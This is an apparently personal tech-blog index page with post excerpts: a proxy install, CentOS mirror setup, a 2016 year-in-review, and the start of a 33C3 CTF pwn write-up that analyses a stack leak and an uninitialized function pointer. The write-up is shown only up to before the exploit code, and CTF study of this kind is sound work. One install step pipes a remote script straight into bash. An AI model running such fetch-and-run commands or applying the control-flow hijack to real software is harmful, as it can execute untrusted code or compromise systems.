            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Cloud-Computing/" itemprop="url" rel="index">
                    <span itemprop="name">Cloud Computing</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <h2 id="MEOW"><a href="#MEOW" class="headerlink" title="MEOW"></a>MEOW</h2><p>安装</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L git.io/meowproxy | bash</span><br><span class="line"><span class="comment"># 建议安装目录 /usr/bin/</span></span><br></pre></td></tr></table></figure>

<p>复制自己的配置文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># in local computer</span></span><br><span class="line">xclip -sel clipboard &lt; ~/.meow/rc</span><br><span class="line"><span class="comment"># in CentOS server</span></span><br><span class="line"><span class="built_in">mv</span> ~/.meow/rc ~/.meow/rc.bak</span><br><span class="line">xclip -o -sel clipboard &gt; ~/.meow/rc</span><br></pre></td></tr></table></figure>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/04/Kubernetes%E9%83%A8%E7%BD%B2@1-5/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/03/CentOS1@1-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/03/CentOS1@1-3/" itemprop="url">Centos初始化</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-03T16:21:43+08:00">
                2017-01-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index">
                    <span itemprop="name">Linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure>

<h3 id="写入国内源-centos-7"><a href="#写入国内源-centos-7" class="headerlink" title="写入国内源(centos 7)"></a>写入国内源(centos 7)</h3><p>ustc： <a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/wiki/mirrors/help/centos">https://lug.ustc.edu.cn/wiki/mirrors/help/centos</a></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/03/CentOS1@1-3/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/assessing-new-technology">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/assessing-new-technology" itemprop="url">Assessing New Technology</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-03T08:10:00+08:00">
                2017-01-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          It is easy to bless or criticise a piece of technology without understanding what they do. Let's change this.
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/assessing-new-technology">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/01/2017-01-01-2016-summary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/01/2017-01-01-2016-summary/" itemprop="url">2016 年个人总结</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-01T22:55:57+08:00">
                2017-01-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/summary/" itemprop="url" rel="index">
                    <span itemprop="name">summary</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="关于创业"><a href="#关于创业" class="headerlink" title="关于创业"></a>关于创业</h2><p>今年年中，公司顺利拿到了腾讯的一笔 <a target="_blank" rel="noopener" href="http://www.jiemodui.com/N/48718.html">4000 万美元的投资</a>。2016年，资本其实有些进入寒冬的感觉，好多公司都融不到资，我们能够进一步拿到融资，还是挺厉害的。</p>
<p>我们公司今年也借着融资的机会，向业界宣布改名成「猿辅导」，「猿辅导」是我们期望的商业化变现的途径，看起来虽然艰难，但是也还是能够有一些希望。这次从「猿题库」改名成「猿辅导」，其实是想更加重视这块核心业务。最终，我们在年底通过猿辅导的直播课做到了 <a target="_blank" rel="noopener" href="https://www.jiemodui.com/N/63659.html">1.2 亿</a> 的营收。今年很多公司靠直播挣到了钱，陌陌更是靠直播打了一个<a target="_blank" rel="noopener" href="http://www.ifanr.com/716023">翻身仗</a>。</p>
<p>嗯，今年我还被几次搞错成猿辅导的创始人，实在有点哭笑不得，可能是很多时候我会对外说「我在创业」，说「我们公司」，但是这个其实仅仅表示我是把自己当作创业团队的一份子，让自己拥有创业的心态，努力希望整个团队创业成功。我在猿辅导公司的职务是小猿搜题产品技术负责人，这是一个很重要的职位，我自己的期权也不少，所以对外表现出在创业的状态不是很正常么？</p>
<p>说到小猿搜题，今年最大的事情可能就是在年中的时候把猿辅导嵌入到小猿搜题中。内嵌另一个应用带来了大量的沟通和技术架构上的调整，不过最终这个改动还是值得的，让猿辅导得到了小猿搜题不少流量支持。</p>
<p>小猿搜题今年用户量很快就过亿了，我们内部吃了一个蛋糕庆祝了一下。不过用户量实在涨得有些快，我自己其实都没什么感觉。想想最激动的时候，竟然是去年庆祝用户量突破 1000 万的时候。这就像达成一个成就之后，就会有新的目标一样，小猿搜题在用户增长上已经很好了，大家的关注点就移到了别的问题上。</p>
<p>2015 年我的工作主要是组建和磨合团队，今年团队成员比较稳定了，我自己的工作主要是日常的项目跟进，重要成员沟通，产品把握。反思整个 2016 年团队的工作，我规划得还是不够系统，一些重要的功能没有优先做，另外一些优化工作做得很乱，不系统。希望 2017 年能够更加努力，让小猿搜题在竞争上有所突破。</p>
<h2 id="写作和分享"><a href="#写作和分享" class="headerlink" title="写作和分享"></a>写作和分享</h2><p>今年在写作上有些犹豫，一方面 iOS 开发不再是我的主要工作，要不要继续投入时间学习和分享 iOS 知识？另一方面，我又希望自己能够持续写作，有一些产出。最终我还是抽了不少时间写 iOS 方面的文章，开了几个新的主题来写，一个是 iOS 面试题，一个是 iOS 开发中的算法，但是都没有最终写完。Swift 烧脑系列倒是基本完结了，反响不错，以下是 Swift 烧脑系列的文章列表：</p>
<ul>
<li>   <a href="/2016/02/27/swift-gym-1-nested-optional/">Swift 烧脑体操（一） - Optional 的嵌套</a></li>
<li>   <a href="/2016/02/27/swift-gym-2-function-argument/">Swift 烧脑体操（二） - 函数的参数</a></li>
<li>   <a href="/2016/02/27/swift-gym-3-higher-order-function/">Swift 烧脑体操（三） - 高阶函数</a></li>
<li>   <a href="/2016/03/05/swift-gym-4-map-and-flatmap/">Swift 烧脑体操（四） - map 和 flatMap</a></li>
<li>   <a href="/2016/04/05/swift-gym-5-monad/">Swift 烧脑体操（五）- Monad</a></li>
<li>   <a href="/2016/05/22/swift-gym-6-type-infer/">Swift 烧脑体操（六）- 类型推断</a></li>
</ul>
<p>由于自己的工作涉及产品管理，所以我也开始尝试写一些产品体验报告，主要希望通过这种方式来增加自己产品的感觉，今年写的体验报告有：</p>
<ul>
<li>   <a href="/2016/12/03/liulishuo-dongni-english-summary/">流利说「懂你英语」体验报告</a></li>
<li>   <a href="/2016/12/18/kuaishou-summary/">快手体验报告</a></li>
</ul>
<h2 id="读书"><a href="#读书" class="headerlink" title="读书"></a>读书</h2><p>去年底定的一个月读一本书的目标基本完成了，读书笔记今年写了不少。有几本书特别难啃，所以最终离每月一篇读书笔记的目标还差一点。2016 年的读书笔记包括：</p>
<ul>
<li>   <a href="/2016/01/17/how-to-read-a-book-summary/">《如何阅读一本书》</a></li>
<li>   <a href="/2016/02/16/make-friend-with-time/">《奇特的一生》</a></li>
<li>   <a href="/2016/02/16/the-leadership-pipeline-summary/">《领导梯队》</a></li>
<li>   <a href="/2016/02/16/inspired-summary/">《启示录》</a></li>
<li>   <a href="/2016/04/19/control-yourself/">《把时间当做朋友》</a></li>
<li>   <a href="/2016/06/06/high-output-management-summary/">《格鲁夫给经理人的第一课》</a></li>
<li>   <a href="/2016/07/07/the-dictators-handbook-summary/">《独裁者手册》</a></li>
<li>   <a href="/2016/07/24/management-30-summary/">《管理 3.0》</a></li>
<li>   <a href="/2016/09/01/dev-level-up-stories/">《技术人创业攻略》</a></li>
<li>   <a href="/2016/09/16/what-is-love/">《少有人走的路》</a></li>
<li>   <a href="/2016/08/22/soft-skills/">《软技能：代码之外的生存指南》</a></li>
</ul>
<p>除了以上这些书之外，今年还读了《简约至上》，《点石成金》，GTD的入门书《搞定》，吴军老师的《硅谷之谜》，德鲁克的《管理的实践》，每月一期的《程序员》杂志（谢谢唐小引老师的赠阅），还有一些 iOS 方面的图书，不过这些都没整理出读书笔记。</p>
<h2 id="分享"><a href="#分享" class="headerlink" title="分享"></a>分享</h2><p>分享方面，2016 年 3 月 27 日，我参加了 InfoQ 举办的技术社群大会，我分享的主题是关于 iOS 开发的个人成长问题，分享之后相关内容也被整理成了文字，放到了我的博客上：<a href="/2016/07/20/from-newbie-to-master/">《成长为 iOS 大 V 的秘密》</a>。</p>
<p>2016 年 4 月份，我在南京的软件技术大会（4 月 16～17 日）以及上海的 SwiftCon 大会（4 月 23～24 日）上做了关于 Monad 的分享。然后，当了三次 iOS 技术会议的吉祥物（其实就是帮忙邀请嘉宾或者客串主持）：一次是年初的 atSwift 大会，一次是年中的 MDCC 大会，还有一次是年末的 iDev 大会。</p>
<p>池建强做了一个 1024 元的付费群，我也报名参加了。听了之次分享后，我也去那里做了一次分享嘉宾。分享是在支付宝付费群里面通过语音的方式，感觉也是非常有意思。</p>
<p>年底尝试了一次在趣直播的分享，主要讲的是 iOS 的安全和 App Transport Security，那天正好是圣诞节，但是还是有 1500 多人报名参加，直播到最后还有 600 人在线，算是一个不错的尝试。直播的稀缺性和互动模式确实比公众号带来的收益更高，不过参与人数上还是比公众号文章少一些，我最终从这次分享中收入了 3000 块钱的报名费，但更多的体会是体验了一把做主播的感觉。</p>
<h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><p>2016 年 3 月，由于被撞库攻击，我丢失了百度云的帐号，里面有我保存的许多家人的照片，幸好找到 sunnyxx 通过百度的同事担保，才强制重置了密码。这件事情之后，我把我的个人密码全部修改了一遍，并且除了最重要的密码外，其余密码全部通过 1password 来管理，重要帐号也开启了二步验证。改完之后，我写了一篇 <a href="/2016/04/07/my-password-management-way/">《应该如何管理密码 - 我的密码管理心得》</a>。</p>
<h2 id="微信公众号和微博"><a href="#微信公众号和微博" class="headerlink" title="微信公众号和微博"></a>微信公众号和微博</h2><p>我的 「iOS开发」微信公众号订阅量达到了 4 万 6 千，不过感觉增长变得比较缓慢了，一方面可能是自己更新的频率有些降低，另一方面微信订阅号平台的红利感觉也已经结束了。由于公众号平台里面有一些与我重名的号，所以思考一段时间后，我把自己的公众号改名为「iOS开发by唐巧」,希望还是保证有一定的辨识度。今年我的微信公众号还是吸引了不少广告主投放，他们是 StuQ、稀土、极客学院、100offer，感谢各位金主。</p>
<p>我的微博粉丝缓慢增长，也达到了 4 万多，与微信公众号订阅量相当，不过微博的广告收入几乎为零。我依然保持基本只发 iOS 开发相关的微博，所以文章的转发量都还不错。</p>
<h2 id="好奇心"><a href="#好奇心" class="headerlink" title="好奇心"></a>好奇心</h2><p>希望自己每年都对事物保持好奇心。今年我基于好奇心做的事情包括：</p>
<ul>
<li><p>   尝试了一把在老小区申请安装充电桩。今年初入了一个便宜的新能源车，然后就想试试能不能装个自用的充电桩。《独裁者手册》里面讲的社会原理在小区物业管理上表现得淋漓尽致，我尝试了各种沟通办法，在我快要放弃时最终搞定充电桩的安装。想想还是非常有意思的一次尝试，我甚至还去朝阳区信访办上访了一把，非常值得体验。从我花的时间和精力来看，这个充电桩安装得不值，但是从了解这个社会各种机构的运作机制来看，这还是一次性价比很高的学习过程。</p>
</li>
<li><p>   出游了几次。其中普吉岛的那次公司集体出游，还是让我感受到了挺多不一样的文化。泰国人民那种安逸，满足的生活态度使得我们这群在互联网行业奋斗的人一下子感受到了很大的差别。整个北京都充满着奋斗，努力，成功的故事，而泰国给我带来的就是一个别样的幸福生活样版。</p>
</li>
<li><p>   学习英语口语。今年我花了不少时间练习口语和听力，花一个月把流利说的「懂你英语」 Level 3 刷通关了。我之前没有刻意做英语的听说练习，由于早期 iOS 开发资料的匮乏，我听了不少 WWDC 的视频。但是我现在越来越发现，阅读和学习英语的资料是非常重要的，所以我希望能够将听力和口语都再提升一个档次，希望有一天可以流利地和国外的开发者相互交流，或者能够有机会去国外的技术会议上分享知识。中国的开发者在技术上从来是不差的，缺的就是交流的能力，所以如果能够走出国内的交流圈子，那么收获的将是和全球一流开发者交流的机会。</p>
</li>
<li><p>   学会了自由泳。3 月份的时候，为了节省时间，花钱请了一个教练，然后坚持游了半年，到 7 月份的时候能够一次性 1000 米了，之后每天中午游 1000 米，当前最好成绩 26 分 10 秒，平均成绩大概在 28 分钟左右徘徊。公司搬到望京后荒废了两个月，希望继续坚持。</p>
</li>
</ul>
<h2 id="成绩"><a href="#成绩" class="headerlink" title="成绩"></a>成绩</h2><p>今年的成绩如下：</p>
<ul>
<li>SwiftCon 最佳演讲</li>
<li>博文视点优秀作者</li>
<li>《iOS 开发进阶》第 6 次重印，总印数 19000 册</li>
<li>小猿搜题用户量破亿</li>
</ul>
<img src="/images/2016-outstanding-speaker.jpg" class="">

<img src="/images/2016-outstanding-author.jpg" class="">

<h2 id="未来的计划"><a href="#未来的计划" class="headerlink" title="未来的计划"></a>未来的计划</h2><p>明年希望自己做好三方面的事情：</p>
<ul>
<li>   总结和学习团队管理知识，把团队的工作规划好。</li>
<li>   通过学习和写作，保持自己在 iOS 开发方面的能力。</li>
<li>   英语听说能力进一步发展，达到和国外同行交流能力。</li>
</ul>
<h2 id="个人-Milestone"><a href="#个人-Milestone" class="headerlink" title="个人 Milestone"></a>个人 Milestone</h2><ul>
<li>   小猿搜题用户量过亿。</li>
</ul>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/01/Web-Log-Blog/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/01/Web-Log-Blog/" itemprop="url">Web + Log = Blog</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-01T16:13:03+08:00">
                2017-01-01
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <h2 id="Blog原来是这样来的"><a href="#Blog原来是这样来的" class="headerlink" title="Blog原来是这样来的"></a>Blog原来是这样来的</h2><blockquote>
<p>博客（英语：Blog，为Web Log的混成词），意指log on the web意即在网络上纪录，是一种由个人管理、张贴新的文章、图片或视频的网站或在线日记，用来纪录、抒发情感或分享信息。 From Wiki.</p>
</blockquote>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/01/Web-Log-Blog/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/12/31/33C3-CTF-2016-rec-200/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/12/31/33C3-CTF-2016-rec-200/" itemprop="url">[33C3 CTF 2016] rec 200</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-31T11:39:00+08:00">
                2016-12-31
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 200<br>Author: bruce30262 @ BambooFox</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>32 bit ELF, 保護全開</p>
<p>程式選單:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./rec </span><br><span class="line">Calculators are fun!</span><br><span class="line">0 - Take note</span><br><span class="line">1 - Read note</span><br><span class="line">2 - Polish</span><br><span class="line">3 - Infix</span><br><span class="line">4 - Reverse Polish</span><br><span class="line">5 - Sign</span><br><span class="line">6 - Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>整理一下幾個較為重要的 function: </p>
<ul>
<li>Take note: 輸入一個 note</li>
<li>Read note: 印出剛剛輸入的 note</li>
<li>Polish: 可以做 <code>sum</code> 運算</li>
<li>Sign: 輸入一個數字，然後印說它是正數還是負數</li>
</ul>
<p>首先會發現到 Read note 那邊怪怪的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ ./rec </span><br><span class="line">Calculators are fun!</span><br><span class="line">0 - Take note</span><br><span class="line">1 - Read note</span><br><span class="line">2 - Polish</span><br><span class="line">3 - Infix</span><br><span class="line">4 - Reverse Polish</span><br><span class="line">5 - Sign</span><br><span class="line">6 - Exit</span><br><span class="line">&gt; 0</span><br><span class="line">Your note: 123</span><br><span class="line">0 - Take note</span><br><span class="line">1 - Read note</span><br><span class="line">2 - Polish</span><br><span class="line">3 - Infix</span><br><span class="line">4 - Reverse Polish</span><br><span class="line">5 - Sign</span><br><span class="line">6 - Exit</span><br><span class="line">&gt; 1</span><br><span class="line">Your note:�VXV`�s��`XV     &lt;-- WTF?</span><br></pre></td></tr></table></figure>
<p>會印出亂碼是因為 take note 的時候，程式會將一個 stack address 當成 note 的 buffer。之後離開該 function 時，因為 function epilogue 的關係，程式會在該 stack address 上面塞入一些 (有用的) address。因此透過 read note，我們可以 leak 出 stack address 跟 text 段的 base address。</p>
<p>此外程式在 <code>sign</code> function 裡面有個邏輯漏洞:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( num &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( num &lt; <span class="number">0</span> )</span><br><span class="line">    v1 = (<span class="type">void</span> (*)(<span class="type">void</span>))puts_negative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v1 = (<span class="type">void</span> (*)(<span class="type">void</span>))puts_positive;</span><br><span class="line">&#125;</span><br><span class="line">v1();</span><br></pre></td></tr></table></figure>

<p>對於正數和負數 <code>sign</code> function 都有做好處理，但是如果我們輸入 <code>0</code> 的話呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ ./rec </span><br><span class="line">Calculators are fun!</span><br><span class="line">0 - Take note</span><br><span class="line">1 - Read note</span><br><span class="line">2 - Polish</span><br><span class="line">3 - Infix</span><br><span class="line">4 - Reverse Polish</span><br><span class="line">5 - Sign</span><br><span class="line">6 - Exit</span><br><span class="line">&gt; 5</span><br><span class="line">0</span><br><span class="line">[1]    40091 segmentation fault (core dumped)  ./rec</span><br></pre></td></tr></table></figure>
<p>程式 crash 了。這是因為 <code>sign</code> 裡面沒有處理 <code>0</code> 的情形，導致程式沒有 assign function pointer 給 <code>v1</code>，進而讓程式執行到 <code>v1()</code> 時產生了 segmentation fault。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先觀察一下 <code>sign</code> function 裡面 assign function pointer 時的組語:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x56555d3b:  mov    eax,DWORD PTR [ebp-0x20]   &lt;-- &amp;v1 = ebp-0x20</span><br><span class="line">0x56555d3e:  call   eax</span><br></pre></td></tr></table></figure>
<p>可以看到，如果我們有辦法控制到 <code>[ebp-0x20]</code> 的值的話，我們就有把辦法控制到 <code>eax</code> 的值，進而控制程式的 control flow。</p>
